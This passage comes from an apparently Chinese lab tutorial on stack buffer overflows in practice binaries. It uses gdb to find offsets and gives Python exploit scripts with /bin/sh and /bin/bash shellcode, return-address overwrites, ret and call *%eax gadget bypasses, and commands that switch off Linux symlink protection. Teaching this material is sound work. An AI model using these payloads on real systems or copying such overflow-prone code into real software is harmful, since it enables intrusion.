title="环境变量继承"></a>环境变量继承</h2><p>程序首先通过getenv函数获取名为HEETIAN的环境变量参数，然后使用strcpy函数将其值复制到buffer缓冲区中，我们知道这样可以引发缓冲区溢出。</p><p>这里当设置超长的环境变量参数数据时，将会产生缓冲区溢出，数据覆盖buffer后会继续覆盖modified变量。</p><p>使用gdb调试并查看主函数反汇编</p><p><img src="/.io//image-20240209180907715.png" alt="image-20240209180907715"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0x0804848d &lt;+9&gt;: movl $0x80485d4,(%esp)</span><br><span class="line"></span><br><span class="line">; 调用getenv获取环境变量HEETIAN的值</span><br><span class="line"></span><br><span class="line">0x08048494 &lt;+16&gt;: call 0x8048364 &lt;getenv@plt&gt;</span><br><span class="line"></span><br><span class="line">; 将结果保存到variable变量，即[esp+0x5c]</span><br><span class="line"></span><br><span class="line">0x08048499 &lt;+21&gt;: mov %eax,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 判断返回结果是否为NULL</span><br><span class="line"></span><br><span class="line">0x0804849d &lt;+25&gt;: cmpl $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">0x080484a2 &lt;+30&gt;: jne 0x80484bc &lt;main+56&gt;</span><br><span class="line"></span><br><span class="line">   ......</span><br><span class="line"></span><br><span class="line">; 初始化modified变量的值为0，位于[esp+0x58]</span><br><span class="line"></span><br><span class="line">0x080484bc &lt;+56&gt;: movl $0x0,0x58(%esp)</span><br><span class="line"></span><br><span class="line">; 调用strcpy对buffer进行填充，位于[esp+0x18]</span><br><span class="line"></span><br><span class="line">0x080484c4 &lt;+64&gt;: mov 0x5c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x080484c8 &lt;+68&gt;: mov %eax,0x4(%esp)</span><br><span class="line"></span><br><span class="line">0x080484cc &lt;+72&gt;: lea 0x18(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x080484d0 &lt;+76&gt;: mov %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x080484d3 &lt;+79&gt;: call 0x8048384 &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line">; 判断modified变量的值是否为0x0d0a0d0a</span><br><span class="line"></span><br><span class="line">0x080484d8 &lt;+84&gt;: cmpl $0xd0a0d0a,0x58(%esp)</span><br><span class="line"></span><br><span class="line">   ......</span><br></pre></td></tr></table></figure><p>通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x18处，而modified位于esp+0x58处，两个地址的距离为0x58 - 0x18 &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当环境变量HEETIAN的值的数据超过64字节时，modified变量就可以被覆盖，但需要控制modified变量的值还需要小心的构造数据。我们只要合理控制环境变量参数的第65~68字节的内容，就可以成功发起溢出攻击了。</p><p>因为目标机器采用小端格式存储数据，而if语句分支要求modified的值为0x0d0a0d0a时才通过判断，因此我们构造的数据应该为\x0a\x0d\x0a\x0d。下面通过两种不同的方法来修改环境变量以达到攻击效果。</p><p><strong>方法一：通过export修改环境变量</strong></p><p>前面已经介绍过通过export可以修改环境变量，执行下面的语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HEETIAN=$(python -c <span class="string">&quot;print &#x27;A&#x27;*64+&#x27;\x0a\x0d\x0a\x0d&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后运行.&#x2F;pwn3就可以看到攻击效果了，如图所示：</p><p><strong>方法二：通过python脚本动态修改环境变量</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    os.putenv(<span class="string">&quot;HEETIAN&quot;</span>,<span class="string">&quot;A&quot;</span>*<span class="number">64</span>+<span class="string">&quot;\x0a\x0d\x0a\x0d&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><p>为了排除前面的环境变量的干扰，我们先修改HEETIAN的的值为AAA，然后再执行python脚本，可以看到攻击效果，如图所示：</p><p><img src="/.io//image-20240209181709836.png" alt="image-20240209181709836"></p><h1 id="执行Shellcode"><a href="#执行Shellcode" class="headerlink" title="执行Shellcode"></a>执行Shellcode</h1><h2 id="背景-5"><a href="#背景-5" class="headerlink" title="背景"></a>背景</h2><p> Shellcode指缓冲区溢出攻击中植入进程的恶意代码，这段代码可以弹出一个消息框，也可以在目标机器上打开一个监听端口，甚至是删除目标机器上的重要文件等。</p><p>   Shellcode通常需要使用汇编语言进行开发，并转换成二进制机器码，其内容和长度经常还会受到很多实际条件的限制，因此开发Shellcode通常都是非常困难的。在实际场景中，我们通常使用Metasploit这个工具来定制各种功能的Shellcode，当然也可以去网上查找一些现有的Shellcode进行测试，通常在shell-storm以及exploit-db等网站上都能找到一些比较成熟和稳定的shellcode，网址为：</p><p><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></p><p><a href="http://www.exploit-db.com/shellcode/">http://www.exploit-db.com/shellcode/</a></p><p>在缓冲区溢出攻击中，如何执行我们的Shellcode呢？我们一般通过输入数据来将Shellcode传递给目标进程，我们已经知道了如何改写函数的返回地址，那么我们可以让程序跳转到栈上的Shellcode去执行，那么就达到了执行Shellcode的目的了。</p><p>一种可行的方案如下图所示：</p><p><img src="/.io//image-20240209182622598.png" alt="image-20240209182622598"></p><p>我们将Shellcode填充到返回地址以上的栈空间中，然后将返回地址改写为Shellcode的起始地址，这样在执行retn指令的时候，就相当于跳转到Shellcode去执行了。</p><p>主机&#x2F;home&#x2F;test&#x2F;6目录下有一个pwn6程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后不会产生任何输出信息并直接退出，然而当输入一定的数据量时，可能会提示<strong>Segmentation fault</strong>的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行&#x2F;bin&#x2F;bash：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">gets</span>(buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写，我们可以输入Shellcode来覆盖栈上的数据，然后通过改写函数返回地址为Shellcode的起始地址来达到执行Shellcode的目的。</p><h2 id="执行Shell-Code"><a href="#执行Shell-Code" class="headerlink" title="执行Shell Code"></a>执行Shell Code</h2><p>使用gdb调试，查看主函数反汇编</p><p><img src="/.io//image-20240209182818286.png" alt="image-20240209182818286"></p><p>在程序入口和gets函数下断点，查看程序入口esp和调用前eax的值。前者是栈底返回地址处，后者是传入的参数，即buffer</p><p><img src="/.io//image-20240209183335160.png" alt="image-20240209183335160"></p><p>0xffffd6cc - 0xffffd680，那么这两个地址的差为76，如下图下图所示：</p><p><img src="/.io//image-20240209183403937.png" alt="image-20240209183403937"></p><p>也就是说，在覆盖了76字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。在返回地址数据之后，我们使用Shellcode来覆盖栈上的内容。从上图中可以看出，Shellcode的起始地址应为0xffffd6cc+4 &#x3D; 0xffffd6d0。</p><p>在gdb调试器下调试pwn6程序时，只要合理控制输入数据的第77~80字节的内容，就可以实现对函数返回地址进行覆盖，我们可以将返回地址填充为0xffffd6d0来实现执行Shellcode的目的。我们对输入数据的构造的布局如下：</p><p><img src="/.io//image-20240209183500620.png" alt="image-20240209183500620"></p><p>创建一个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (<span class="string">&quot;\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A&#x27;</span>*<span class="number">76</span> + <span class="string">&#x27;\xd0\xd6\xff\xff&#x27;</span> + shellcode</span><br></pre></td></tr></table></figure><p>在Shell下执行python pwn6.py &gt; test将输出数据写入test文件，然后再次使用gdb调试pwn6程序，gdb载入pwn6程序后，执行r &lt; test命令，表示将test文件的数据当做输入数据传给pwn6程序，可以看到Shellcode成功执行，新创建了一个&#x2F;bin&#x2F;bash进程：</p><p><img src="/.io//image-20240209183748476.png" alt="image-20240209183748476"></p><p>理论上来说，在shell中执行.&#x2F;pwn6 &lt; test也是可以成功溢出的，但是由于在gdb下和实际情况下栈的基地址不一样，因此实际上在shell中执行.&#x2F;pwn6 &lt; test会提示Segmentation fault。</p><h1 id="绕过返回地址限制"><a href="#绕过返回地址限制" class="headerlink" title="绕过返回地址限制"></a>绕过返回地址限制</h1><h2 id="背景-6"><a href="#背景-6" class="headerlink" title="背景"></a>背景</h2><p>_builtin_return_address函数接收一个参数，可以是0,1,2等。__builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址。</p><p>retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。<strong>如果我们将返回地址覆盖为一条retn指令的地址</strong>，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。</p><p>主机&#x2F;home&#x2F;test&#x2F;7目录下有一个pwn7程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后会产生对应的输出信息并直接退出，然而当输入一定的数据量时，可能会提示bzzzt的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行&#x2F;bin&#x2F;bash：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81</span><br></pre></td></tr></table></figure><p>直接覆盖返回地址跳转到Shellcode执行是不行的，程序对返回地址进行了一点限制，绕过对返回地址的保护限制，以达到执行特定Shellcode的目的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input path please: &quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">gets</span>(buffer);</span><br><span class="line">    ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((ret &amp; <span class="number">0xbf000000</span>) == <span class="number">0xbf000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bzzzt (%p)\n&quot;</span>, ret);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got path %s\n&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">getpath</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getpath函数中定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写。但是也可以看到这里对返回地址和0xbf000000进行与操作，如果高位字节是0xbf的话，那么程序就会退出。</p><h2 id="多层跳转绕过返回地址限制"><a href="#多层跳转绕过返回地址限制" class="headerlink" title="多层跳转绕过返回地址限制"></a>多层跳转绕过返回地址限制</h2><p>使用gdb调试并查看主函数反汇编</p><p><img src="/.io//image-20240209185105463.png" alt="image-20240209185105463"></p><p>对感兴趣的区域下上断点，观察返回地址和buffer地址</p><p><img src="/.io//image-20240209185226279.png" alt="image-20240209185226279"></p><p>有：0xffffd6bc - 0xffffd66c，那么这两个地址的差为80。</p><p>也就是说，在覆盖了80字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。现在因为对返回地址进行了限制，我们显然不能直接跳转到栈上执行代码，因为这里Shellcode的地址的最高字节为0xff，有0xff &amp; 0xbf &#x3D;&#x3D; 0xbf，因此无法通过保护限制。</p><p>这里采用两次跳转的方法来突破这个限制。</p><p>我们可以将一条retn指令的地址来覆盖函数的返回地址，比如getpath的最后一条指令为：</p><p>0x080484e9 &lt;+117&gt;:  ret</p><p>那么，0x080484e9 &amp; 0xbf000000 &#x3D; 0x08000000，可以绕过保护限制，我们让这条retn指令执行时，从栈上取到的数据为Shellcode的地址，就可以执行Shellcode了。那么，我们构造的输入数据应该是这样的：</p><p><img src="/.io//image-20240209185354775.png" alt="image-20240209185354775"></p><p>通过上面的步骤我们已经知道，在gdb调试器下调试pwn7程序时，只要合理控制输入数据的第81~84字节的内容，就可以实现对函数返回地址进行覆盖，我们可以将返回地址填充为0x080484e9来实现执行一条retn指令。</p><p>同时，我们将第85~88字节覆盖为Shellcode的地址。即0xffffd6bc+4+4 &#x3D; 0xffffd6c4，我们对输入数据的构造的布局如下：</p><p><img src="/.io//image-20240209185659543.png" alt="image-20240209185659543"></p><p>在&#x2F;home&#x2F;test&#x2F;7目录下有一个pwn7.py的Python脚本，其源代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (<span class="string">&quot;\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A&#x27;</span>*<span class="number">80</span> + <span class="string">&#x27;\xe9\x84\x04\x08&#x27;</span> + <span class="string">&#x27;\xc4\xd6\xff\xff&#x27;</span>  + shellcode</span><br></pre></td></tr></table></figure><p>在Shell下执行python pwn7.py &gt; test将输出数据写入test文件，然后再次使用gdb调试pwn7程序，gdb载入pwn7程序后，执行r &lt; test命令，表示将test文件的数据当做输入数据传给pwn7程序，可以看到Shellcode成功执行，新创建了一个&#x2F;bin&#x2F;bash进程：</p><p><img src="/.io//image-20240209185827796.png" alt="image-20240209185827796"></p><h1 id="通用跳转技术"><a href="#通用跳转技术" class="headerlink" title="通用跳转技术"></a>通用跳转技术</h1><p><strong>strdup</strong>可以用于复制一个字符串，我们通常使用字符串时会使用<strong>strcpy</strong>，这要求已经定义好了一个接收缓冲区。而<strong>strdup</strong>只接受一个参数，也就是要复制的字符串的地址，strdup()会先用maolloc()配置与参数字符串相同大小的的空间，然后将参数字符串的内容复制到该内存地址，然后把该地址返回。strdup返回的地址最后可以利用free()来释放。</p><p>当输出信息非常多的时候，我们很难快速找到我们感兴趣的信息。使用grep命令可以对匹配特定正则表达式的文本进行搜索，并只输出匹配的行或文本。</p><p>我们可以使用管道将一个程序的输出当做grep的输入数据，grep会根据给定的正则表达式参数对输入数据进行过滤。</p><p>对于grep的参数需要注意这样一个问题：当参数中存在空格时需要用双引号将参数包裹起来，此外，* 是正则表达式里面的通配符，如果要查找 <em>，需要使用反斜杠进行转移，即 \ </em>。</p><p>主机&#x2F;home&#x2F;test&#x2F;8目录下有一个pwn8程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后会产生对应的输出信息并直接退出，然而当输入一定的数据量时，可能会提示<strong>bzzzt</strong>的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行&#x2F;bin&#x2F;sh：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c\x88\x46\x07\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure><p> 除了绕过对返回地址的限制保护之外，还可以使用更加高级的通用跳转技术来执行Shellcode。</p><p>源代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input path please:&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">gets</span>(buffer);</span><br><span class="line">    ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((ret &amp; <span class="number">0xb0000000</span>) == <span class="number">0xb0000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bzzzt (%p)\n&quot;</span>, ret);</span><br><span class="line">       _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got path %s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strdup</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">getpath</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getpath函数中定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出。在程序的末尾调用了strdup对buffer缓冲区中存储的字符串进行复制，并返回了新的缓冲区副本的地址。</p><h2 id="通用跳转技术-1"><a href="#通用跳转技术-1" class="headerlink" title="通用跳转技术"></a>通用跳转技术</h2><p>使用gdb调试pwn8</p><p><img src="/.io//image-20240209191209389.png" alt="image-20240209191209389"></p><p>下断点，获取返回地址和eax地址</p><p><img src="/.io//image-20240209191306099.png" alt="image-20240209191306099"></p><p>上图中红色线条框起来的就是我们执行的gdb命令，粉红色线条框起来的是我们下断点的地址，蓝色线条框起来的是我们想要查看的两个寄存器的值，有：</p><p>0xffffd6bc - 0xffffd66c，那么这两个地址的差为80。</p><p>   也就是说，在覆盖了80字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。</p><p>   现在关注一下函数末尾的几条汇编指令，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x08048518 &lt;+116&gt;:  lea  -0x4c(%ebp),%eax</span><br><span class="line"></span><br><span class="line">0x0804851b &lt;+119&gt;:  mov  %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x0804851e &lt;+122&gt;:  call  0x80483d8 &lt;strdup@plt&gt;</span><br><span class="line"></span><br><span class="line">0x08048523 &lt;+127&gt;:  leave</span><br><span class="line"></span><br><span class="line">0x08048524 &lt;+128&gt;:  ret</span><br></pre></td></tr></table></figure><p>   我们发现程序调用了strdup对输入数据进行复制，然后把新分配的空间的地址返回。在汇编语言中，函数的返回值存储于eax寄存器中，可以在gdb中实际验证一下：</p><p><img src="/.io//image-20240209191345882.png" alt="image-20240209191345882"></p><p>在0x08048523下一个断点，然后输入c继续执行，输入数据后，断点将会断下，这时候通过执行x &#x2F;s $eax命令，看到了我们复制的数据。既然eax寄存器指向复制后的buffer，如果我们将函数的返回地址覆盖为call *%eax这样的指令的地址，那么Shellcode就可以被执行了。可以尝试找到这样的一条指令。</p><p>我们知道通过objdump -d pwn8可以查看pwn8中的汇编指令，而grep可以对指令进行过滤，那么可以在Shell中执行objdump -d pwn8 | grep “call **%eax”来找到我们需要的指令：</p><p><img src="/.io//image-20240209204942339.png" alt="image-20240209204942339"></p><p>通过上面的步骤我们已经知道，可以将getpath函数的返回地址覆盖为0x0804849f，就可以执行call *%eax了。这里我们需要将Shellcode布局到buffer的最前面，shellcode与返回地址之间不足的数据可以用A来填充，我们对输入数据的构造的布局如下：</p><p><img src="/.io//image-20240209204953377.png" alt="image-20240209204953377"></p><p>编写python脚本，填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (<span class="string">&quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c\x88\x46&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\x07\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">junk = (<span class="number">80</span>-<span class="built_in">len</span>(shellcode))*<span class="string">&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> shellcode + junk + <span class="string">&#x27;\x9f\x84\x04\x08&#x27;</span></span><br></pre></td></tr></table></figure><p>在Shell下执行python pwn8.py &gt; test将输出数据写入test文件，然后再次使用gdb调试pwn8程序，gdb载入pwn8程序后，执行r &lt; test命令，表示将test文件的数据当做输入数据传给pwn8程序，可以看到Shellcode成功执行，新创建了一个&#x2F;bin&#x2F;bash进程：</p><p><img src="/.io//image-20240209205220669.png" alt="image-20240209205220669"></p><h1 id="竟态条件漏洞"><a href="#竟态条件漏洞" class="headerlink" title="竟态条件漏洞"></a>竟态条件漏洞</h1><h2 id="背景-7"><a href="#背景-7" class="headerlink" title="背景"></a>背景</h2><p>竞态条件（race condition），从多进程间通信的角度来讲，是指两个或多个进程对共享的数据进行读或写的操作时，最终的结果取决于这些进程的执行顺序。</p><p>在ubuntu的11.04或者12.04版本默认配置已经开启了对竞态条件漏洞的保护策略。这个保护策略严格限制了在什么情况下可以去跟踪操作一个符号链接指向的文件。帮助文档中对这个策略是这么描述的：“在所有人都可写的目录（比如说&#x2F;tmp目录）中存在的符号链接，被链接的文件与目录与符号链接的创建者不同时，被链接的文件不可以被操作”。简单举例来帮助大家理解一下：在&#x2F;tmp目录下有一个软连接&#x2F;tmp&#x2F;abc指向&#x2F;etc&#x2F;shadow，而这个软连接是test用户（uid为1000）的用户创建。那么，任何情况下都无法通过这个软连接来修改&#x2F;etc&#x2F;shadow文件。</p><p>  如果实验在ubuntu12.04版本进行，则需要关掉这个防护功能。以下两种方法都可以关闭此配置。</p><p>  1)$ sudo sysctl -w kernel.yama.protected_sticky_symlinks&#x3D;0</p><p>  2)$ sudo echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;protected_symlinks</p><p>  本次实验在ubuntu 16.04环境下进行，命令为</p><p>  $ sudo sysctl -w fs.protected_symlinks&#x3D;0</p><p>一个看起来很正常的程序但是却存在竞态条件漏洞的程序，源码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 